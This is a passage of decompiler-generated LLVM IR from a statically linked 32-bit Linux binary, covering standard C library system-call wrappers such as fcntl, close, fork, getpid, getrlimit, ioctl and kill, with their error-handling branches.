  store i32 134588098, i32* %stack_var_-4, align 4
  call void @__pseudo_call(i32 %v2_805a6b6)
  store i32 0, i32* @ebx, align 4
  call void @exit(i32 0)
  unreachable

dec_label_pc_805a6cb:                             ; preds = %dec_label_pc_805a679, %dec_label_pc_805a671, %entry
  %v0_805a6cb = call i32 @__syscall_error()
  ret i32 %v0_805a6cb

; uselistorder directives
  uselistorder i32 %v4_805a6b2, { 2, 1, 0, 3 }
  uselistorder i32 %v0_805a69b, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @clone, { 4, 1, 0, 3, 2 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @__sigsetjmp(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %tmp2 = ptrtoint i32* %arg2 to i32
  store i32 %tmp2, i32* %stack_var_4, align 4
  store i32 %tmp2, i32* %eax.global-to-local, align 4
  %v0_805a6d4 = load i32, i32* @ebx, align 4
  store i32 %v0_805a6d4, i32* %arg2, align 4
  %v0_805a6d6 = load i32, i32* @esi, align 4
  %v2_805a6d6 = add i32 %tmp2, 4
  %v3_805a6d6 = inttoptr i32 %v2_805a6d6 to i32*
  store i32 %v0_805a6d6, i32* %v3_805a6d6, align 4
  %v0_805a6d9 = load i32, i32* @edi, align 4
  %v1_805a6d9 = load i32, i32* %eax.global-to-local, align 4
  %v2_805a6d9 = add i32 %v1_805a6d9, 8
  %v3_805a6d9 = inttoptr i32 %v2_805a6d9 to i32*
  store i32 %v0_805a6d9, i32* %v3_805a6d9, align 4
  %v2_805a6dc = ptrtoint i32* %stack_var_4 to i32
  %v1_805a6e0 = load i32, i32* %eax.global-to-local, align 4
  %v2_805a6e0 = add i32 %v1_805a6e0, 16
  %v3_805a6e0 = inttoptr i32 %v2_805a6e0 to i32*
  store i32 %v2_805a6dc, i32* %v3_805a6e0, align 4
  %v1_805a6e6 = load i32, i32* %eax.global-to-local, align 4
  %v2_805a6e6 = add i32 %v1_805a6e6, 20
  %v3_805a6e6 = inttoptr i32 %v2_805a6e6 to i32*
  store i32 %arg1, i32* %v3_805a6e6, align 4
  %v0_805a6e9 = load i32, i32* @ebp, align 4
  %v1_805a6e9 = load i32, i32* %eax.global-to-local, align 4
  %v2_805a6e9 = add i32 %v1_805a6e9, 12
  %v3_805a6e9 = inttoptr i32 %v2_805a6e9 to i32*
  store i32 %v0_805a6e9, i32* %v3_805a6e9, align 4
  %v0_805a6ec = call i32 @__sigjmp_save()
  store i32 %v0_805a6ec, i32* %eax.global-to-local, align 4
  ret i32 %v0_805a6ec

; uselistorder directives
  uselistorder i32* %stack_var_4, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v0_805a6f4 = load i32, i32* @ebx, align 4
  %v2_805a6fb = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_805a6fb, i32* @ebx, align 4
  %v8_805a6ff = call i32 @mmap(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_805a6f4, i32* @ebx, align 4
  %v3_805a708 = icmp ugt i32 %v8_805a6ff, -4096
  call void @__pseudo_cond_branch(i1 %v3_805a708, i32 134615028)
  ret i32 %v8_805a6ff

; uselistorder directives
  uselistorder i32 %v8_805a6ff, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp14 = call i32 @__decompiler_undefined_function_0()
  %v0_805a710 = load i32, i32* @edi, align 4
  %v0_805a711 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_805a725 = add i32 %arg2, -12
  %v6_805a72f = icmp ugt i32 %v1_805a725, 2
  br i1 %v6_805a72f, label %dec_label_pc_805a73f, label %dec_label_pc_805a731

dec_label_pc_805a731:                             ; preds = %entry
  %v4_805a735 = call i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_805a725)
  br label %dec_label_pc_805a761

dec_label_pc_805a73f:                             ; preds = %entry
  store i32 %arg1, i32* @ebx, align 4
  %v3_805a747 = call i32 @fcntl(i32 %v0_805a711, i32 %tmp14, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_805a747, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v3_805a747, -4095
  br i1 %tmp, label %dec_label_pc_805a75f, label %dec_label_pc_805a753

dec_label_pc_805a753:                             ; preds = %dec_label_pc_805a73f
  %v1_805a753 = call i32 @__errno_location(i32 %v0_805a711)
  %v0_805a758 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805a758 = sub i32 0, %v0_805a758
  %v2_805a75a = inttoptr i32 %v1_805a753 to i32*
  store i32 %v1_805a758, i32* %v2_805a75a, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805a75f

dec_label_pc_805a75f:                             ; preds = %dec_label_pc_805a73f, %dec_label_pc_805a753
  %v0_805a75f = phi i32 [ %v3_805a747, %dec_label_pc_805a73f ], [ -1, %dec_label_pc_805a753 ]
  br label %dec_label_pc_805a761

dec_label_pc_805a761:                             ; preds = %dec_label_pc_805a731, %dec_label_pc_805a75f
  %v0_805a766 = phi i32 [ %v4_805a735, %dec_label_pc_805a731 ], [ %v0_805a75f, %dec_label_pc_805a75f ]
  store i32 %v0_805a711, i32* @ebx, align 4
  store i32 %v0_805a710, i32* @edi, align 4
  ret i32 %v0_805a766

; uselistorder directives
  uselistorder i32 %v3_805a747, { 1, 0, 2 }
  uselistorder i32 %v0_805a711, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @fcntl, { 12, 11, 10, 9, 8, 3, 2, 1, 0, 7, 6, 5, 4 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805a761, { 1, 0 }
  uselistorder label %dec_label_pc_805a75f, { 1, 0 }
}

define i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805a768 = load i32, i32* @edi, align 4
  store i32 %v0_805a768, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v0_805a780 = load i32, i32* @ebx, align 4
  %v1_805a788 = call i32 @int80_syscall(i32 221)
  store i32 %v1_805a788, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805a788, -4095
  br i1 %tmp, label %dec_label_pc_805a7a0, label %dec_label_pc_805a794

dec_label_pc_805a794:                             ; preds = %entry
  %v1_805a794 = call i32 @__errno_location(i32 %v0_805a780)
  %v0_805a799 = load i32, i32* %edi.global-to-local, align 4
  %v1_805a799 = sub i32 0, %v0_805a799
  %v2_805a79b = inttoptr i32 %v1_805a794 to i32*
  store i32 %v1_805a799, i32* %v2_805a79b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805a7a0

dec_label_pc_805a7a0:                             ; preds = %entry, %dec_label_pc_805a794
  %v0_805a7a0 = phi i32 [ %v1_805a788, %entry ], [ -1, %dec_label_pc_805a794 ]
  %v2_805a7a5 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805a7a5, i32* %edi.global-to-local, align 4
  ret i32 %v0_805a7a0

; uselistorder directives
  uselistorder i32 %v1_805a788, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805a7a0, { 1, 0 }
}

define i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-8 = alloca i32, align 4
  %v0_805a7a9 = load i32, i32* @esi, align 4
  store i32 %v0_805a7a9, i32* %stack_var_-8, align 4
  %v4_805a7b1 = ptrtoint %sigaction* %arg2 to i32
  store i32 %v4_805a7b1, i32* @ecx, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_805a7bd = load i32, i32* @ebx, align 4
  %v7_805a7c5 = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_805a7c5, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v7_805a7c5, -4095
  br i1 %tmp, label %dec_label_pc_805a7dd, label %dec_label_pc_805a7d1

dec_label_pc_805a7d1:                             ; preds = %entry
  %v1_805a7d1 = call i32 @__errno_location(i32 %v0_805a7bd)
  %v0_805a7d6 = load i32, i32* %esi.global-to-local, align 4
  %v1_805a7d6 = sub i32 0, %v0_805a7d6
  %v2_805a7d8 = inttoptr i32 %v1_805a7d1 to i32*
  store i32 %v1_805a7d6, i32* %v2_805a7d8, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805a7dd

dec_label_pc_805a7dd:                             ; preds = %entry, %dec_label_pc_805a7d1
  %v0_805a7dd = phi i32 [ %v7_805a7c5, %entry ], [ -1, %dec_label_pc_805a7d1 ]
  %v2_805a7e0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805a7e0, i32* @esi, align 4
  ret i32 %v0_805a7dd

; uselistorder directives
  uselistorder i32 %v7_805a7c5, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805a7dd, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @__GI__exit(i32 %arg1) local_unnamed_addr #0 {
entry:
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805a80c = load i32, i32* @edi, align 4
  store i32 %v0_805a80c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_805a814 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_805a81c = call i32 @close(i32 %v0_805a814)
  store i32 %v0_805a814, i32* @ebx, align 4
  store i32 %v1_805a81c, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805a81c, -4095
  br i1 %tmp, label %dec_label_pc_805a834, label %dec_label_pc_805a828

dec_label_pc_805a828:                             ; preds = %entry
  %v1_805a828 = call i32 @__errno_location(i32 %v0_805a814)
  %v0_805a82d = load i32, i32* %edi.global-to-local, align 4
  %v1_805a82d = sub i32 0, %v0_805a82d
  %v2_805a82f = inttoptr i32 %v1_805a828 to i32*
  store i32 %v1_805a82d, i32* %v2_805a82f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805a834

dec_label_pc_805a834:                             ; preds = %entry, %dec_label_pc_805a828
  %v0_805a834 = phi i32 [ %v1_805a81c, %entry ], [ -1, %dec_label_pc_805a828 ]
  %v2_805a836 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805a836, i32* @edx, align 4
  %v2_805a838 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805a838, i32* @edi, align 4
  ret i32 %v0_805a834

; uselistorder directives
  uselistorder i32 %v1_805a81c, { 1, 0, 2 }
  uselistorder i32 %v0_805a814, { 1, 0, 2 }
  uselistorder i32 (i32)* @close, { 26, 25, 24, 23, 22, 21, 20, 19, 3, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805a834, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805a83c = load i32, i32* @ebx, align 4
  store i32 %v0_805a83c, i32* %stack_var_-4, align 4
  %v1_805a845 = call i32 @fork(i32 %v0_805a83c)
  store i32 %v1_805a845, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805a845, -4095
  br i1 %tmp, label %dec_label_pc_805a85c, label %dec_label_pc_805a850

dec_label_pc_805a850:                             ; preds = %entry
  %v0_805a850 = load i32, i32* %stack_var_-4, align 4
  %v1_805a850 = call i32 @__errno_location(i32 %v0_805a850)
  %v0_805a855 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805a855 = sub i32 0, %v0_805a855
  %v2_805a857 = inttoptr i32 %v1_805a850 to i32*
  store i32 %v1_805a855, i32* %v2_805a857, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805a85c

dec_label_pc_805a85c:                             ; preds = %entry, %dec_label_pc_805a850
  %v0_805a85c = phi i32 [ %v1_805a845, %entry ], [ -1, %dec_label_pc_805a850 ]
  %v2_805a860 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805a860, i32* @ebx, align 4
  ret i32 %v0_805a85c

; uselistorder directives
  uselistorder i32 %v1_805a845, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32)* @fork, { 10, 9, 8, 7, 6, 3, 2, 5, 4, 1, 0 }
  uselistorder label %dec_label_pc_805a85c, { 1, 0 }
}

define i32 @__libc_fsync(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805a864 = load i32, i32* @edi, align 4
  store i32 %v0_805a864, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_805a86c = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_805a874 = call i32 @fsync(i32 %v0_805a86c)
  store i32 %v1_805a874, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805a874, -4095
  br i1 %tmp, label %dec_label_pc_805a88c, label %dec_label_pc_805a880

dec_label_pc_805a880:                             ; preds = %entry
  %v1_805a880 = call i32 @__errno_location(i32 %v0_805a86c)
  %v0_805a885 = load i32, i32* %edi.global-to-local, align 4
  %v1_805a885 = sub i32 0, %v0_805a885
  %v2_805a887 = inttoptr i32 %v1_805a880 to i32*
  store i32 %v1_805a885, i32* %v2_805a887, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805a88c

dec_label_pc_805a88c:                             ; preds = %entry, %dec_label_pc_805a880
  %v0_805a88c = phi i32 [ %v1_805a874, %entry ], [ -1, %dec_label_pc_805a880 ]
  %v2_805a890 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805a890, i32* %edi.global-to-local, align 4
  ret i32 %v0_805a88c

; uselistorder directives
  uselistorder i32 %v1_805a874, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805a88c, { 1, 0 }
}

define i32 @getdtablesize(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_805a897 = ptrtoint i32* %stack_var_-8 to i32
  %v2_805a89e = call i32 @getrlimit(i32 7, i32 %v2_805a897)
  store i32 256, i32* @edx, align 4
  %v2_805a8ab = icmp slt i32 %v2_805a89e, 0
  br i1 %v2_805a8ab, label %dec_label_pc_805a8b3, label %dec_label_pc_805a8af

dec_label_pc_805a8af:                             ; preds = %entry
  %v3_805a8af = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_805a8af, i32* @edx, align 4
  br label %dec_label_pc_805a8b3

dec_label_pc_805a8b3:                             ; preds = %entry, %dec_label_pc_805a8af
  %v0_805a8b3 = phi i32 [ 256, %entry ], [ %v3_805a8af, %dec_label_pc_805a8af ]
  ret i32 %v0_805a8b3

; uselistorder directives
  uselistorder i32 (i32, i32)* @getrlimit, { 1, 0 }
  uselistorder label %dec_label_pc_805a8b3, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805a8bc = load i32, i32* @ebx, align 4
  store i32 %v0_805a8bc, i32* %stack_var_-4, align 4
  %v1_805a8c5 = call i32 @int80_syscall(i32 201)
  store i32 %v1_805a8c5, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805a8c5, -4095
  br i1 %tmp, label %dec_label_pc_805a8dc, label %dec_label_pc_805a8d0

dec_label_pc_805a8d0:                             ; preds = %entry
  %v0_805a8d0 = load i32, i32* %stack_var_-4, align 4
  %v1_805a8d0 = call i32 @__errno_location(i32 %v0_805a8d0)
  %v0_805a8d5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805a8d5 = sub i32 0, %v0_805a8d5
  %v2_805a8d7 = inttoptr i32 %v1_805a8d0 to i32*
  store i32 %v1_805a8d5, i32* %v2_805a8d7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805a8dc

dec_label_pc_805a8dc:                             ; preds = %entry, %dec_label_pc_805a8d0
  %v0_805a8dc = phi i32 [ %v1_805a8c5, %entry ], [ -1, %dec_label_pc_805a8d0 ]
  %v2_805a8e0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805a8e0, i32* @ebx, align 4
  ret i32 %v0_805a8dc

; uselistorder directives
  uselistorder i32 %v1_805a8c5, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805a8dc, { 1, 0 }
}

define i32 @__GI_getpagesize(i32 %arg1) local_unnamed_addr {
entry:
  %v0_805a8e4 = load i32, i32* @global_var_807d134.638, align 4
  %v1_805a8ee = icmp eq i32 %v0_805a8e4, 0
  br i1 %v1_805a8ee, label %dec_label_pc_805a8f4, label %dec_label_pc_805a8f2

dec_label_pc_805a8f2:                             ; preds = %entry
  br label %dec_label_pc_805a8f4

dec_label_pc_805a8f4:                             ; preds = %entry, %dec_label_pc_805a8f2
  %storemerge = phi i32 [ %v0_805a8e4, %dec_label_pc_805a8f2 ], [ 4096, %entry ]
  %v0_805a8f4 = phi i32 [ %v0_805a8e4, %dec_label_pc_805a8f2 ], [ 4096, %entry ]
  store i32 %storemerge, i32* @edx, align 4
  ret i32 %v0_805a8f4

; uselistorder directives
  uselistorder label %dec_label_pc_805a8f4, { 1, 0 }
}

define i32 @__libc_getpid(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805a8f8 = load i32, i32* @ebx, align 4
  store i32 %v0_805a8f8, i32* %stack_var_-4, align 4
  %v1_805a901 = call i32 @getpid(i32 %v0_805a8f8)
  store i32 %v1_805a901, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805a901, -4095
  br i1 %tmp, label %dec_label_pc_805a918, label %dec_label_pc_805a90c

dec_label_pc_805a90c:                             ; preds = %entry
  %v0_805a90c = load i32, i32* %stack_var_-4, align 4
  %v1_805a90c = call i32 @__errno_location(i32 %v0_805a90c)
  %v0_805a911 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805a911 = sub i32 0, %v0_805a911
  %v2_805a913 = inttoptr i32 %v1_805a90c to i32*
  store i32 %v1_805a911, i32* %v2_805a913, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805a918

dec_label_pc_805a918:                             ; preds = %entry, %dec_label_pc_805a90c
  %v0_805a918 = phi i32 [ %v1_805a901, %entry ], [ -1, %dec_label_pc_805a90c ]
  %v2_805a91c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805a91c, i32* @ebx, align 4
  ret i32 %v0_805a918

; uselistorder directives
  uselistorder i32 %v1_805a901, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805a918, { 1, 0 }
}

define i32 @getppid(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805a920 = load i32, i32* @ebx, align 4
  store i32 %v0_805a920, i32* %stack_var_-4, align 4
  %v1_805a929 = call i32 @getppid(i32 %v0_805a920)
  store i32 %v1_805a929, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805a929, -4095
  br i1 %tmp, label %dec_label_pc_805a940, label %dec_label_pc_805a934

dec_label_pc_805a934:                             ; preds = %entry
  %v0_805a934 = load i32, i32* %stack_var_-4, align 4
  %v1_805a934 = call i32 @__errno_location(i32 %v0_805a934)
  %v0_805a939 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805a939 = sub i32 0, %v0_805a939
  %v2_805a93b = inttoptr i32 %v1_805a934 to i32*
  store i32 %v1_805a939, i32* %v2_805a93b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805a940

dec_label_pc_805a940:                             ; preds = %entry, %dec_label_pc_805a934
  %v0_805a940 = phi i32 [ %v1_805a929, %entry ], [ -1, %dec_label_pc_805a934 ]
  %v2_805a944 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805a944, i32* @ebx, align 4
  ret i32 %v0_805a940

; uselistorder directives
  uselistorder i32 %v1_805a929, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32)* @getppid, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_805a940, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805a948 = load i32, i32* @ebx, align 4
  store i32 %v0_805a948, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_805a95b = call i32 @int80_syscall(i32 191)
  store i32 %v1_805a95b, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805a95b, -4095
  br i1 %tmp, label %dec_label_pc_805a974, label %dec_label_pc_805a968

dec_label_pc_805a968:                             ; preds = %entry
  %v0_805a968 = load i32, i32* %stack_var_-4, align 4
  %v1_805a968 = call i32 @__errno_location(i32 %v0_805a968)
  %v0_805a96d = load i32, i32* %ebx.global-to-local, align 4
  %v1_805a96d = sub i32 0, %v0_805a96d
  %v2_805a96f = inttoptr i32 %v1_805a968 to i32*
  store i32 %v1_805a96d, i32* %v2_805a96f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805a974

dec_label_pc_805a974:                             ; preds = %entry, %dec_label_pc_805a968
  %v0_805a974 = phi i32 [ %v1_805a95b, %entry ], [ -1, %dec_label_pc_805a968 ]
  %v2_805a978 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805a978, i32* @ebx, align 4
  ret i32 %v0_805a974

; uselistorder directives
  uselistorder i32 %v1_805a95b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 191, { 1, 0 }
  uselistorder label %dec_label_pc_805a974, { 1, 0 }
}

define i32 @gettimeofday(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_805a97c = load i32, i32* @ebx, align 4
  store i32 %v0_805a97c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_805a98f = call i32 @gettimeofday(i32 %v0_805a97c, i32 %tmp4, i32 %arg1, i32 %arg2)
  store i32 %v4_805a98f, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_805a98f, -4095
  br i1 %tmp, label %dec_label_pc_805a9a8, label %dec_label_pc_805a99c

dec_label_pc_805a99c:                             ; preds = %entry
  %v0_805a99c = load i32, i32* %stack_var_-4, align 4
  %v1_805a99c = call i32 @__errno_location(i32 %v0_805a99c)
  %v0_805a9a1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805a9a1 = sub i32 0, %v0_805a9a1
  %v2_805a9a3 = inttoptr i32 %v1_805a99c to i32*
  store i32 %v1_805a9a1, i32* %v2_805a9a3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805a9a8

dec_label_pc_805a9a8:                             ; preds = %entry, %dec_label_pc_805a99c
  %v0_805a9a8 = phi i32 [ %v4_805a98f, %entry ], [ -1, %dec_label_pc_805a99c ]
  %v2_805a9ac = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805a9ac, i32* @ebx, align 4
  ret i32 %v0_805a9a8

; uselistorder directives
  uselistorder i32 %v4_805a98f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805a9a8, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_805a9b0 = load i32, i32* @edi, align 4
  store i32 %v0_805a9b0, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_805a9c8 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_805a9d0 = call i32 @ioctl(i32 %v0_805a9c8, i32 %tmp9, i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_805a9c8, i32* @ebx, align 4
  store i32 %v3_805a9d0, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v3_805a9d0, -4095
  br i1 %tmp, label %dec_label_pc_805a9e8, label %dec_label_pc_805a9dc

dec_label_pc_805a9dc:                             ; preds = %entry
  %v1_805a9dc = call i32 @__errno_location(i32 %v0_805a9c8)
  %v0_805a9e1 = load i32, i32* %edi.global-to-local, align 4
  %v1_805a9e1 = sub i32 0, %v0_805a9e1
  %v2_805a9e3 = inttoptr i32 %v1_805a9dc to i32*
  store i32 %v1_805a9e1, i32* %v2_805a9e3, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805a9e8

dec_label_pc_805a9e8:                             ; preds = %entry, %dec_label_pc_805a9dc
  %v0_805a9e8 = phi i32 [ %v3_805a9d0, %entry ], [ -1, %dec_label_pc_805a9dc ]
  %v2_805a9ed = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805a9ed, i32* @edi, align 4
  ret i32 %v0_805a9e8

; uselistorder directives
  uselistorder i32 %v3_805a9d0, { 1, 0, 2 }
  uselistorder i32 %v0_805a9c8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805a9e8, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805a9f0 = load i32, i32* @ebx, align 4
  store i32 %v0_805a9f0, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_805aa03 = call i32 @kill(i32 %v0_805a9f0, i32 %tmp4)
  store i32 %v2_805aa03, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_805aa03, -4095
  br i1 %tmp, label %dec_label_pc_805aa1c, label %dec_label_pc_805aa10

dec_label_pc_805aa10:                             ; preds = %entry
  %v0_805aa10 = load i32, i32* %stack_var_-4, align 4
  %v1_805aa10 = call i32 @__errno_location(i32 %v0_805aa10)
  %v0_805aa15 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805aa15 = sub i32 0, %v0_805aa15
  %v2_805aa17 = inttoptr i32 %v1_805aa10 to i32*
  store i32 %v1_805aa15, i32* %v2_805aa17, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805aa1c

dec_label_pc_805aa1c:                             ; preds = %entry, %dec_label_pc_805aa10
  %v0_805aa1c = phi i32 [ %v2_805aa03, %entry ], [ -1, %dec_label_pc_805aa10 ]
  %v2_805aa1e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805aa1e, i32* @edx, align 4
  %v2_805aa20 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805aa20, i32* @ebx, align 4
  ret i32 %v0_805aa1c

; uselistorder directives
  uselistorder i32 %v2_805aa03, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @kill, { 9, 7, 0, 1, 8, 6, 5, 4, 3, 2 }
  uselistorder label %dec_label_pc_805aa1c, { 1, 0 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_805aa26 = load i32, i32* @ebx, align 4
  store i32 %v0_805aa26, i32* %stack_var_-12, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v2_805aa3a = ptrtoint i32* %stack_var_-20 to i32
